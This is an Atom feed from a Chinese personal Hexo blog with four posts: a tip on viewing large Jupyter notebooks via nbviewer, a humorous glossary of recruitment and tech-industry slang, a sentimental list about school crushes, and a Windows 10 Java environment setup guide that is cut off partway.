<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>教书的先生</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-11-28T11:04:19.207Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>王荣胜</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>解决在github上查看ipynb（大文件）笔记时加载很慢以及失败的问题</title>
    <link href="http://yoursite.com/2019/11/28/%E8%A7%A3%E5%86%B3%E5%9C%A8github%E4%B8%8A%E6%9F%A5%E7%9C%8Bipynb%EF%BC%88%E5%A4%A7%E6%96%87%E4%BB%B6%EF%BC%89%E7%AC%94%E8%AE%B0%E6%97%B6%E5%8A%A0%E8%BD%BD%E5%BE%88%E6%85%A2%E4%BB%A5%E5%8F%8A%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2019/11/28/解决在github上查看ipynb（大文件）笔记时加载很慢以及失败的问题/</id>
    <published>2019-11-28T10:55:09.000Z</published>
    <updated>2019-11-28T11:04:19.207Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>markdown和code能一起使用真是非常方便，在本地使用jupyter notebook书写笔记，然后上传到github上，不仅自己复习的时候方便查阅，还能帮到其他有需要的人。在github上查看ipynb文件以及大文件时，需要加载很长时间，而且经常加载失败。使用起来很不方便而且让人头疼、浪费时间。比如我查看优达学城的一个<a href="https://github.com/q759729997/Udacity_nd101_cn_p4/blob/master/dlnd_face_generation.ipynb" target="_blank" rel="noopener">深度学习</a> 的小项目，如果直接访问github仓库里的ipynb文件的话，会遇到加载失败或者等很久情况，如下图：</p><a id="more"></a><img src="https://s2.ax1x.com/2019/11/28/QiOSu4.png" alt="QiOSu4.png" border="0"><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>文件打不开很让人头疼，但是一个好的方法可以解决：<br>免费的<a href="https://nbviewer.jupyter.org/" target="_blank" rel="noopener">nbviewer开源项目</a> ，解决了上面的问题。所有上传到github上的ipynb文件，都会同步到nbviewer服务器上。笔记也经过了渲染，显示效果很棒，而且访问速度非常快，使用方法是在nbviewer主页上，输入别人或自己的github用户名，找到自己创建的仓库，再找到对应的笔记。比如上面无法显示的笔记，去nbviewer上查看的话，能快速打开笔记，方便查看笔记内容。例如输入刚才那位用户的ID：q759729997 或者刚才项目位置：q759729997/Udacity_nd101_cn_p4</p><img src="https://s2.ax1x.com/2019/11/28/QiLXCV.png" alt="QiLXCV.png" border="0"><p>瞬间就能打开自己想看的项目：</p><img src="https://s2.ax1x.com/2019/11/28/QiL7Hs.png" alt="QiL7Hs.png" border="0"><p>你们点击链接体验一下加载速度：<a href="https://nbviewer.jupyter.org/github/q759729997/Udacity_nd101_cn_p4/tree/master/" target="_blank" rel="noopener">点击这里 深度学习项目</a> ，然后再打开ipynb的笔记。<br>几万行的代码可以瞬间打开，不用因为加载失败或者打不开让你头疼。<br>你可别学经常使用github的不会这个技能。它可以让你大大的节省时间学习其他知识。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;p&gt;markdown和code能一起使用真是非常方便，在本地使用jupyter notebook书写笔记，然后上传到github上，不仅自己复习的时候方便查阅，还能帮到其他有需要的人。在github上查看ipynb文件以及大文件时，需要加载很长时间，而且经常加载失败。使用起来很不方便而且让人头疼、浪费时间。比如我查看优达学城的一个&lt;a href=&quot;https://github.com/q759729997/Udacity_nd101_cn_p4/blob/master/dlnd_face_generation.ipynb&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;深度学习&lt;/a&gt; 的小项目，如果直接访问github仓库里的ipynb文件的话，会遇到加载失败或者等很久情况，如下图：&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="查看大文件" scheme="http://yoursite.com/tags/%E6%9F%A5%E7%9C%8B%E5%A4%A7%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>程序员的黑话</title>
    <link href="http://yoursite.com/2019/11/28/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E9%BB%91%E8%AF%9D/"/>
    <id>http://yoursite.com/2019/11/28/程序员的黑话/</id>
    <published>2019-11-28T03:54:29.000Z</published>
    <updated>2019-11-28T04:01:37.935Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、招聘行话大全，能听懂证明你是历经磨难的老司机"><a href="#一、招聘行话大全，能听懂证明你是历经磨难的老司机" class="headerlink" title="一、招聘行话大全，能听懂证明你是历经磨难的老司机"></a>一、招聘行话大全，能听懂证明你是历经磨难的老司机</h1><p>刚开始投简历时，你总以为是这样的，其实大部分情况下是那样的……</p><p>面试之后，HR让回去等消息，傻傻的等待，半个月以上没有回音，各种焦虑……</p><p>明面上的意思就是实际意思的公司，貌似都是说的是别人的公司……</p><a id="more"></a><p>下面是职场达人总结的招聘行业术语（俗称招聘黑话），一看就懂证明你是历经磨难且具有拼搏精神的老司机，让我们一起来看看吧：</p><p>1、能承受较大的工作压力——加班</p><p>2、抗压能力强——加班+替别人扛雷</p><p>3、工作有激情——自觉加班还要特美</p><p>4、有强烈责任心——没做完不准走</p><p>5、弹性工作制——加班不给加班费</p><p>6、弹性工作制，但不保证准时下班——做完了才准走</p><p>7、包三餐——早晚都得加班</p><p>8、双休——工作日加班</p><p>9、薪资+社保+带薪休假+职位晋升——是个正经公司都有，没什么拿得出手的福利</p><p>10、适应较快的工作节奏——加班把三天的工作两天做完</p><p>11、公司提供水果——貌似也就这一个福利</p><p>12、有强烈的上进心——干完工作就加班去干其他工作</p><p>13、喜欢有挑战性的工作——加班、前人留的坑不少</p><p>14、不提倡加班——你懂的（该加还得加，加班是因为你工作效率低，不是安排工作多）</p><p>15、不强制加班——你懂的 （不做完额外安排的工作你走一个试试！）</p><p>16、上不封顶——下不保底</p><p>17、偶尔会忙——以后忙了你别抱怨，提醒过了</p><p>18、团队氛围很好——大家经常一起加班，一起吃加班餐，聊聊工作，多happy</p><p>19、上升空间大——工资低，3000元涨个50%不也就4500吗？</p><p>20、领导安排的其它任务——我叫你干啥你就得干啥</p><p>21、妹子多——这个屌丝虽然脑子不太好使但便宜，看看这个理由能不能骗一蛤</p><p>22、有期权——没多余的现金发工资给你</p><p>23、有股权——工资微妙地低于你应得的数，反正我不信你能干满拿走</p><p>24、年底双薪——13 薪</p><p>25、13 薪起——别想了，就是13 薪</p><p>26、年底有奖金——年薪大于 12 薪小于 13 薪</p><p>27、我们 6 点准时下班 -——入职才知道最严重的早晨 6 点下班，回家吃早饭睡觉。</p><p>28、扁平化管理 -——领导和你坐一屋，盯着你干活</p><p>29、核心团队来自 BAT ——嗯，你不是BAT的，所以你不是核心</p><p>30、”我把你的简历整理一下”——对方说这个的话基本可以判断他是卖人头外派的了,把你的简历给他的甲方。</p><p>31、弹性工作时间——只弹下班（下班时间不固定），不弹上班</p><p>32、能独立完成任务 ——前端后端或产品测试推广运营全都你一个人干</p><p>33、领导好——看你顺眼就好，不顺眼就 XX ；你有生之年不可能有晋升的空间</p><p>34、XXX 比钱重要——钱达不到你的要求</p><p>35、公司会给你培训，但是工作之后你要交培训费——麻痹就是培训班</p><p>36、BAT 薪资——略微高于本地市场价</p><p>37、帮员工避税——按最低工资给你交社保公积金（五险一金）</p><p>38、我们是创业公司——有不少坑要填，另请做好加班拼命的准备</p><p>39、老板\负责人不在，稍后会联系你的——面试不合格，不要抱期望了</p><h1 id="二、独具互联网特色的招聘行话"><a href="#二、独具互联网特色的招聘行话" class="headerlink" title="二、独具互联网特色的招聘行话"></a>二、独具互联网特色的招聘行话</h1><p>40、期权激励拿到手软——希望能弥补你看到基本工资后的脚软</p><p>41、专注移动互联网，拥有几亿活跃用户——&gt;就注册了个微信公众号</p><p>42、有活力的技术团队——团队平均工作经验&lt;1年</p><p>43、创始团队全部来自BAT——&gt;在淘宝干过客服、自己玩过微信公众号、还在百度实过习</p><p>44、千亿市场的探索者——目前尚没看清具体市场在哪</p><p>45、扁平化管理，高度自由——全公司人数，一只手就数的过来。</p><p>46、典型欧美创业工作环境——办公室现处于毛坯房状态</p><p>47、新技术+新方向+新团队——嗯，目前这三样都没有</p><p>48、直进核心团队——公司尚未设置非核心团队岗</p><p>49、全方位成长机会——你有很大机会成为外卖超人</p><p>50、有机会晋升技术合伙人 ——&gt;现在就缺一个程序员来码代码了!</p><p>51、提供各种福利——每样细说咱就伤感情了</p><p>52、福利完善，待遇从优——&gt;严格按照法定节假日上班和……上班。</p><p>53、有完善的员工期权激励措施——&gt;所以对工资要求别太高。</p><p>54、提供住宿、班车及两餐——每周提供数小时时间与家人团聚</p><p>55、底薪+岗位绩效+职称奖+管理绩效+提成+五险 ——和在一块您看看够不56、够付这个月房租?</p><p>57、加入我们，给你足够大的发展空间！——目前公司规模&lt;10人</p><p>58、女性员工占一半以上——&gt;创业公司的员工性别结构为:男生、女汉子以及别人的女友。</p><p>59、深受资本追捧，行业方向被投资人看好——&gt;又有几个同行拿到融资了，而他们还在追着投资人跑</p><p>60、大牛云集——我司属牛的同事比较多</p><p>61、与互联网大咖面对面，有巨大成长空间——&gt;加了个混充有某某大佬的微信群，常年潜水从不说话，好友更不加。</p><p>62、公司计划短期内上市——您也知道计划一般赶不上变化</p><p>63、徘徊在牛A和牛C之间一群人！——永不止步，从来没在牛B上停驻过</p><h1 id="三、程序员的职场行话"><a href="#三、程序员的职场行话" class="headerlink" title="三、程序员的职场行话"></a>三、程序员的职场行话</h1><p>程序员也有自己的行业表达方式，这些话只要是老司机都能懂的：</p><p>1、那个bug没问题啊，你再试试——刚偷偷改完这个bug</p><p>2、下个版本再做吧——根本就不想做</p><p>3、正在改——忘了有这回事了</p><p>4、需求太不合理——这逻辑不好做</p><p>5、别人家的实现方式不一样——我不会做</p><p>6、产品逻辑不对——傻X，还不如我上</p><p>7、最近老加班——老板该加工资了</p><p>8、我回去评估一下技术难度——先拖两天</p><p>9、你这个需求不清晰——我不想做</p><p>10、你确定有这个需求吗？——做出来没人用老子跟你拼了</p><p>11、下次肯定不延期了——先应付了这次再说</p><p>12、你试过……——到底会不会用我的程序啊</p><p>13、我测试没问题啊！——到底会不会用我的程序啊</p><p>14、我的时间排满了——我不想做</p><p>15、我有优先级更高的任务——我不想做</p><p>16、我今晚有事——我今天不想加班</p><p>17、我在调试程序——我没时间理你</p><p>18、你怎么还在自学Python啊？——PHP才是最好的语言</p><p>19、你怎么还用 Word 啊？——Markdown 才是最好的写作工具</p><p>20、你怎么还在用 ThinkPad 啊？——Mac 才是最好的电脑</p><h1 id="四、互联网人常用的行话"><a href="#四、互联网人常用的行话" class="headerlink" title="四、互联网人常用的行话"></a>四、互联网人常用的行话</h1><h2 id="1、熊厂、狼厂、蓝厂——百度"><a href="#1、熊厂、狼厂、蓝厂——百度" class="headerlink" title="1、熊厂、狼厂、蓝厂——百度"></a>1、熊厂、狼厂、蓝厂——百度</h2><p>百度的Logo是一个蓝色的熊爪子，所以蓝厂和熊厂的名字是这样来的，但是相比来说，百度更多的时候被叫做狼厂，起源于百度CEO李彦宏给百度员工的一封公开信：《鼓励狼性淘汰小资》，引起广泛的讨论，之后百度有员工就开始称百度为「狼厂」。</p><p>百老汇——百度离职员工组织</p><p>百度老员工汇聚地，知名“百老汇”成员有王啸、边江、毕胜、周品等。</p><p>肉饼——李彦宏</p><p>同百度CEO李彦宏的英文名Robin的发音，李彦宏也叫厂长。有个段子是：</p><p>“LR过了没有？”</p><p>“没有提。”</p><p>“经理批了没有？”</p><p>“没有。”</p><p>“架构批了没有？”</p><p>“没有。”</p><p>“需求池里排队了没有？”</p><p>“没有。”</p><p>“那你特喵跟我要排期？”</p><p>“厂长报的。”</p><p>“明天启动，周五上线！”</p><p>狼性——洗脑</p><p>在百度认可公司价值观，被称为狼性，被员工私下称为奴性。</p><h2 id="2、猫厂、东厂、西厂——阿里巴巴"><a href="#2、猫厂、东厂、西厂——阿里巴巴" class="headerlink" title="2、猫厂、东厂、西厂——阿里巴巴"></a>2、猫厂、东厂、西厂——阿里巴巴</h2><p>阿里巴巴是因为旗下天猫的Logo而演变来的，所以叫做猫厂。除此之外在浙江杭州有东西两处办公地点，被内部员工称为东厂和西厂。</p><p>曾经的阿里人、前橙会、阿里校友会——阿里离职员工组织</p><p>曾经的阿里人和阿里校友会这两个名字都是很好理解的，前橙会名字的由来是因为橙色是阿里巴巴的标志色彩,“前橙会”顾名思义是聚集阿里巴巴“原厂”员工的一个机构。</p><p>百阿——洗脑</p><p>百阿是百年阿里的简称，阿里巴巴从1999年成立，马云的设想是做到102年，这样就可以横跨20、21、22三个世纪。百阿是新员工培训，戏称洗脑。</p><p>996——工作时间</p><p>猫厂专用，指早上9点上班，晚上9点下班，一周工作6天。997就是一周工作7天。</p><p>3.25——KPI</p><p>阿里公司每年两次KPI考核，考核一般分为3.25、3.5、3.75，其比例是163，也就是10个人里必须有一个人拿3.25，两次3.25有可能要被末位淘汰。</p><p>拥抱变化——变需求</p><p>阿里公司的价值观之一，员工要时刻拥护。比方一个项目变来变去，可以说我们这是拥抱变化。</p><h2 id="3、鹅厂——腾讯"><a href="#3、鹅厂——腾讯" class="headerlink" title="3、鹅厂——腾讯"></a>3、鹅厂——腾讯</h2><p>腾讯名字的原由就比较简单了，因为腾讯的Logo是一只企鹅，企鹅也是鹅。</p><p>南极圈、单飞的企鹅——腾讯离职员工组织</p><p>腾讯经常在发布的产品中采用“飞翔的企鹅”作为昵称，因此这些离职的朋友把群的名字叫做“单飞的企鹅”。</p><p>瑞雪——文明</p><p>鹅厂专用，代表腾讯人良好的行为举止，涵盖道德、礼仪、职业行为，起源于某年腾讯员工冒着雨雪正常进行年会演出。不良好的行为比方插队，可以说这个人真不瑞雪。</p><p>高压线——泄露工资</p><p>鹅厂专用。有几条，包括严禁贪腐，严禁泄露工资等。一般指禁止透漏工资，触犯此条开除。</p><p>8000——网管</p><p>鹅厂内部电话，电脑问题找8000，密码忘了找8000，RTX登不了找8000……</p><h2 id="4、渣浪——新浪"><a href="#4、渣浪——新浪" class="headerlink" title="4、渣浪——新浪"></a>4、渣浪——新浪</h2><p>新浪人称渣浪人人都知道，当然这么渣的名字就不是自称得来的了，而是A站和B站网友对新浪视频的称号，起因是up主使用外链投稿曾多次被新浪审核但又无故删除，使得UP主们抓狂，从此就有了“战渣浪”的定义。</p><p>毕浪——离职员工组织</p><p>从新浪毕业的人，和碧浪同音。</p><h2 id="5、猪厂——网易"><a href="#5、猪厂——网易" class="headerlink" title="5、猪厂——网易"></a>5、猪厂——网易</h2><p>这个名字内部人基本不用，也是属于外面人叫得比较多一点，起源是网易CEO丁磊在之前养过一段时间的猪，所以就这样被传开了。</p><p>离易、妖鹿山——离职员工组织</p><p>离易的意思就是离开网易，和离异同音，妖鹿山同音163，是网易的域名。</p><h2 id="6、狐厂——搜狐"><a href="#6、狐厂——搜狐" class="headerlink" title="6、狐厂——搜狐"></a>6、狐厂——搜狐</h2><p>搜狐的吉祥物是一只红色大尾巴的小狐狸，所以被叫做狐厂，不过对搜狐的人使用花名的时间并不多。</p><h2 id="7、狗厂——京东"><a href="#7、狗厂——京东" class="headerlink" title="7、狗厂——京东"></a>7、狗厂——京东</h2><p>由来：为了和天猫打一场硬架，2013年3月30日，京东高调地更换域名、logo及VI系统,随之,一只名为“Joy”的金属小狗也空降互联网，于是在电商领域，阿里巴巴和京东的交战也可以被称为“猫狗大战”。</p><p>东京不热——离职员工组织</p><p>京东，东京，东京热，东京不热。</p><h2 id="8、绿厂、数字公司——奇虎360"><a href="#8、绿厂、数字公司——奇虎360" class="headerlink" title="8、绿厂、数字公司——奇虎360"></a>8、绿厂、数字公司——奇虎360</h2><p>由来：绿厂名字的带来是360的Logo颜色，不过OPPO也是绿色的Logo所以也被叫做绿厂，但是360更加出名的花名是数字公司，因为360嘛。</p><h2 id="9、杂粮、粗粮、粮厂——小米"><a href="#9、杂粮、粗粮、粮厂——小米" class="headerlink" title="9、杂粮、粗粮、粮厂——小米"></a>9、杂粮、粗粮、粮厂——小米</h2><p>由来：杂粮名字的由来是360周鸿祎2012年和雷军在微博上打口水战而来，而后又被传播为粗粮和粮厂。</p><p>小米粒——小米离职员工组织</p><h2 id="10、盛斗士——盛大离职员工组织"><a href="#10、盛斗士——盛大离职员工组织" class="headerlink" title="10、盛斗士——盛大离职员工组织"></a>10、盛斗士——盛大离职员工组织</h2><p>据说在盛大工作过1-2年叫盛斗士;3-5年叫必盛客;6-9年叫斗战盛佛，10年以上叫齐天大盛。</p><p>消失的巨人——巨人离职员工组织</p><p>旧金山——金山离职员工组织</p><p>老友记——人人网离职员工组织</p><p>这个名字源于公司附近的一家餐馆，以及人人的社交属性。</p><p>驼厂——去哪儿</p><p>来由：去哪儿的logo演变过来的。</p><p>鸟厂、蜂厂——迅雷</p><p>来由：迅雷公司的主打产品迅雷下载，其Logo为一只蜂鸟，不过被叫做鸟厂的情况居多。</p><p>豆厂——豆瓣</p><p>来由：取豆瓣公司的名字豆字。豆瓣的员工多数自称厂工。</p><p>松鼠厂——UC</p><p>来由：UC浏览器的logo里面有一只橙色的松鼠。</p><p>海豚厂——携程</p><p>来由：携程logo演变而来的。</p><p>牛厂——途牛</p><p>来由：logo演变而来的。</p><p>马路公司——第七大道</p><p>来由：大道不就是马路吗？</p><h1 id="五、听懂中国-“外交行话”必备大全"><a href="#五、听懂中国-“外交行话”必备大全" class="headerlink" title="五、听懂中国 “外交行话”必备大全"></a>五、听懂中国 “外交行话”必备大全</h1><p>经常在电视上看到国家领导人和外国领导人亲切友好的会谈，他们的</p><p>1、亲切友好的交谈——字面意思；</p><p>2、坦率交谈——分歧很大，无法沟通；</p><p>3、交换了意见——会谈各说各的，没有达成协议；</p><p>4、充分交换了意见——双方无法达成协议，吵得厉害；</p><p>5、增进了双方的了解——双方分歧很大；</p><p>6、会谈是有益的——双方目标暂时相距甚远，能坐下来谈就很好；</p><p>7、我们持保留态度——我们拒绝同意；</p><p>8、尊重——不完全同意；</p><p>9、赞赏——不尽同意；</p><p>10、遗憾——不满；</p><p>11、不愉快——激烈的冲突。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、招聘行话大全，能听懂证明你是历经磨难的老司机&quot;&gt;&lt;a href=&quot;#一、招聘行话大全，能听懂证明你是历经磨难的老司机&quot; class=&quot;headerlink&quot; title=&quot;一、招聘行话大全，能听懂证明你是历经磨难的老司机&quot;&gt;&lt;/a&gt;一、招聘行话大全，能听懂证明你是历经磨难的老司机&lt;/h1&gt;&lt;p&gt;刚开始投简历时，你总以为是这样的，其实大部分情况下是那样的……&lt;/p&gt;
&lt;p&gt;面试之后，HR让回去等消息，傻傻的等待，半个月以上没有回音，各种焦虑……&lt;/p&gt;
&lt;p&gt;明面上的意思就是实际意思的公司，貌似都是说的是别人的公司……&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="程序员黑话" scheme="http://yoursite.com/tags/%E7%A8%8B%E5%BA%8F%E5%91%98%E9%BB%91%E8%AF%9D/"/>
    
  </entry>
  
  <entry>
    <title>在学校喜欢一个人有多甜</title>
    <link href="http://yoursite.com/2019/11/23/%E5%9C%A8%E5%AD%A6%E6%A0%A1%E5%96%9C%E6%AC%A2%E4%B8%80%E4%B8%AA%E4%BA%BA%E6%9C%89%E5%A4%9A%E7%94%9C/"/>
    <id>http://yoursite.com/2019/11/23/在学校喜欢一个人有多甜/</id>
    <published>2019-11-23T15:55:19.000Z</published>
    <updated>2019-11-23T16:03:58.083Z</updated>
    
    <content type="html"><![CDATA[<h1 id="01"><a href="#01" class="headerlink" title="01"></a>01</h1><p>换个座位就是异地恋</p><a id="more"></a><h1 id="02"><a href="#02" class="headerlink" title="02"></a>02</h1><p>不甘朋友</p><p>不敢恋人</p><h1 id="03"><a href="#03" class="headerlink" title="03"></a>03</h1><p>分分钟处于装逼状态。</p><h1 id="04"><a href="#04" class="headerlink" title="04"></a>04</h1><p>自己以为藏得很好，</p><p>但全班都知道你喜欢她。</p><p>每次她被叫起来回答问题时，</p><p>全班都会看向你。</p><h1 id="05"><a href="#05" class="headerlink" title="05"></a>05</h1><p>成为醋坛子</p><p>成为跟踪狂</p><p>成为一个不认识的自己</p><h1 id="06"><a href="#06" class="headerlink" title="06"></a>06</h1><p>很顾及自己的形象</p><p>和他对你的看法</p><h1 id="07"><a href="#07" class="headerlink" title="07"></a>07</h1><p>每天早上醒来满满是动力，</p><p>一要上学就开心</p><p>各种装逼装傻，</p><p>一下课就找理由找他身边晃，</p><p>一节课扭头看几十次。</p><h1 id="08"><a href="#08" class="headerlink" title="08"></a>08</h1><p>不敢和她说话，</p><p>怕太深情被误会。</p><p>为什么暗恋那么好，</p><p>因为暗恋永远不会失恋。</p><h1 id="09"><a href="#09" class="headerlink" title="09"></a>09</h1><p>你一笑我开心很多天，</p><p>你一句话我记得好多年。</p><h1 id="10"><a href="#10" class="headerlink" title="10"></a>10</h1><p>总是有意无意地想要看见他，</p><p>做夸张的事情吸引他注意，</p><p>要是正好能看见他往这里看</p><p>会高兴很长时间。</p><p>跟同学闹的时候会注意形象</p><p>怕出丑让他看到。</p><p>会跟他最好的哥们</p><p>或者上下铺打好关系，</p><p>想把好吃的都塞给他</p><p>想知道他所有的一切 </p><h1 id="11"><a href="#11" class="headerlink" title="11"></a>11</h1><p>偷偷模仿他的一切，</p><p>他转笔的动作，</p><p>他喝水的方式，</p><p>以及临摹他的签名。</p><h1 id="12"><a href="#12" class="headerlink" title="12"></a>12</h1><p>旋转运动时，</p><p>总是偷偷转过去看他。</p><h1 id="13"><a href="#13" class="headerlink" title="13"></a>13</h1><p>每天都要在镜子面前</p><p>打扮好久才去学校</p><h1 id="14"><a href="#14" class="headerlink" title="14"></a>14</h1><p>写不完的作业，</p><p>枯燥无味的课，</p><p>闷热嘈杂的教室，</p><p>无数个不想上学的理由，</p><p>抵不过你的存在之于我的动力。</p><h1 id="15"><a href="#15" class="headerlink" title="15"></a>15</h1><p>看不见他时四处寻找，</p><p>看到他时又假装没看到或是不认识。</p><h1 id="16"><a href="#16" class="headerlink" title="16"></a>16</h1><p>我一点都不喜欢上学</p><p>但因为你</p><p>我嫌九年义务教育太短</p><h1 id="17"><a href="#17" class="headerlink" title="17"></a>17</h1><p>一下课就喜欢往他的方向看，</p><p>一上讲台眼睛一直锁定那个位置。</p><h1 id="18"><a href="#18" class="headerlink" title="18"></a>18</h1><p>看到他和别的女同学谈笑风生，</p><p>一天都高兴不起来；</p><p>见他跟自己搭话，</p><p>连做梦也会笑；</p><p>有他在的地方，</p><p>五米处必有我；</p><p>学校活动只要他参加，</p><p>我都有各种理由靠近他；</p><p>他用完的没有笔墨的笔</p><p>在我的抽屉里放了许久；</p><p>他的一声不轻不重的咳嗽声</p><p>敲在我的心里。</p><h1 id="19"><a href="#19" class="headerlink" title="19"></a>19</h1><p>别人面前大大咧咧无底线各种没形象，</p><p>在他面前各种乖各种淑女一秒变成小绵羊</p><h1 id="20"><a href="#20" class="headerlink" title="20"></a>20</h1><p>因为连续几天看不见他心情一落千丈，</p><p>又因为只看了他一眼高兴到起飞</p><h1 id="21"><a href="#21" class="headerlink" title="21"></a>21</h1><p>我会绕遍整个校园只为看他一眼，</p><p>然后装毫不在意的路过</p><h1 id="22"><a href="#22" class="headerlink" title="22"></a>22</h1><p>我努力让自己有资格</p><p>站在全校师生的面前接受荣誉</p><p>只是想看你一眼</p><p>也让你看看我</p><h1 id="23"><a href="#23" class="headerlink" title="23"></a>23</h1><p>成了变态追踪狂，</p><p>你连我是谁都不知道，</p><p>我却偷偷喜欢了你那么久。</p><h1 id="24"><a href="#24" class="headerlink" title="24"></a>24</h1><p>上课开小差或者玩手机的时候，</p><p>会为他把风，作业会借给他抄，</p><p>下课会为他收拾书桌，</p><p>放学会给他收拾书包，</p><p>由着周围的同学起哄</p><p>他平淡地否认而自己窃喜。</p><h1 id="25"><a href="#25" class="headerlink" title="25"></a>25</h1><p>我记得在以前</p><p>我喜欢的人坐在我的斜后方</p><p>我经常有意无意的</p><p>向着正右方的窗户看着</p><p>用余光静静地看着</p><p>正在写作业的时的认真模样</p><p>因为说出的话让他无意中听到笑了</p><p>便会开心一整天</p><p>像吃了糖一样</p><h1 id="26"><a href="#26" class="headerlink" title="26"></a>26</h1><p>有时候碰巧去教室的时候走在他前面，</p><p>怎么走路都不会了</p><h1 id="27"><a href="#27" class="headerlink" title="27"></a>27</h1><p>他因为生病一周没来</p><p>每次早上我都看看门口他来没</p><p>次次都没来</p><p>他的小伙伴每次进门第一句话</p><p>就是和我说他没来</p><p>一周后他病好了回来了</p><p>班里人都在看我</p><p>我特高兴还不能表现出来</p><h1 id="28"><a href="#28" class="headerlink" title="28"></a>28</h1><p>在操场食堂教学楼里</p><p>用很笨拙的方式向你靠近</p><p> 故意在超市逗留</p><p>因为知道你也会来买冷饮 </p><p>拉着好朋友走得飞快</p><p>然后在你附近又把脚步放慢偷偷瞄你</p><p> 你不知道吧</p><p>每一次巧合里都有我的努力</p><h1 id="29"><a href="#29" class="headerlink" title="29"></a>29</h1><p>如果你上学时有那么一个暗恋的人 </p><p>不管有没有在一起 </p><p>他（她）都将是你美好的回忆 </p><p>是过往岁月中一道暖暖的光 </p><p>再想起时 你会轻轻一笑 ：</p><p>哦 ，原来那时我会那样呢，</p><p> 加油 心中有爱的人！</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;01&quot;&gt;&lt;a href=&quot;#01&quot; class=&quot;headerlink&quot; title=&quot;01&quot;&gt;&lt;/a&gt;01&lt;/h1&gt;&lt;p&gt;换个座位就是异地恋&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="甜" scheme="http://yoursite.com/tags/%E7%94%9C/"/>
    
  </entry>
  
  <entry>
    <title>win10配置Java开发环境</title>
    <link href="http://yoursite.com/2019/11/22/win10%E9%85%8D%E7%BD%AEJava%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
    <id>http://yoursite.com/2019/11/22/win10配置Java开发环境/</id>
    <published>2019-11-22T06:44:16.000Z</published>
    <updated>2019-11-22T06:53:54.329Z</updated>
    
    <content type="html"><![CDATA[<p>软件开发环境，是一个程序的运行的支撑，Java作为近年来最热门的编程语言之一，越来越多的新人程序员选择Java来学习，它的开发环境搭建也是学习和使用这一编程语言的基础。<br>今天我们将在Windows上配置Java的开发环境。</p><a id="more"></a><p><a href="https://sm.ms/image/x3CONMptcTi5uJ4" target="_blank"><img src="https://i.loli.net/2019/11/22/x3CONMptcTi5uJ4.jpg"></a></p><h1 id="1-下载并安装JDK-JAVA-Development-Kit"><a href="#1-下载并安装JDK-JAVA-Development-Kit" class="headerlink" title="1.下载并安装JDK(JAVA Development Kit)"></a>1.下载并安装JDK(JAVA Development Kit)</h1><p>JDK是整个java开发的核心，它包含了JAVA的运行环境，JAVA工具和JAVA基础的类库。</p><blockquote><p>下载地址：<br><a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/index.html</a></p></blockquote><p>安装JDK只需要按正常步骤安装即可</p><h1 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2.配置环境变量"></a>2.配置环境变量</h1><h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><p>打开我的电脑，按照如下操作顺序：“鼠标右键–&gt;属性–&gt;高级系统设置–&gt;高级–&gt;环境变量”</p><p><a href="https://sm.ms/image/zb6GcmSEqprThs7" target="_blank"><img src="https://i.loli.net/2019/11/22/zb6GcmSEqprThs7.jpg"></a></p><p>选择环境变量过后，我们可以看到如下界面，此时再选择“系统变量–&gt;新建”，此时将会弹出新建系统变量的对话框，在变量名处输入“JAVA_HOME”，在变量值中输入JDK的安装路径，点击确定；</p><p><a href="https://sm.ms/image/CZTdPL8Y9EfJOUz" target="_blank"><img src="https://i.loli.net/2019/11/22/CZTdPL8Y9EfJOUz.jpg"></a></p><p>修改”path”变量。在变量后增加两条路径</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%JAVA_HOME%\bin</span><br><span class="line"></span><br><span class="line">%JAVA_HOME%\jre\bin</span><br></pre></td></tr></table></figure><p><a href="https://sm.ms/image/FIL26OmuTKb8fX5" target="_blank"><img src="https://i.loli.net/2019/11/22/FIL26OmuTKb8fX5.jpg"></a></p><h2 id="新建-修改CLASSPATH-变量"><a href="#新建-修改CLASSPATH-变量" class="headerlink" title="新建/修改CLASSPATH 变量"></a>新建/修改CLASSPATH 变量</h2><p>如果存在 CLASSPATH 变量，选中点击 编辑。</p><p>如果没有，点击 新建。</p><p>输入/在已有的变量值后面添加：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">变量名：CLASSPATH</span><br><span class="line">变量值：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre></td></tr></table></figure><p><a href="https://sm.ms/image/emZEnRfT9u23GPz" target="_blank"><img 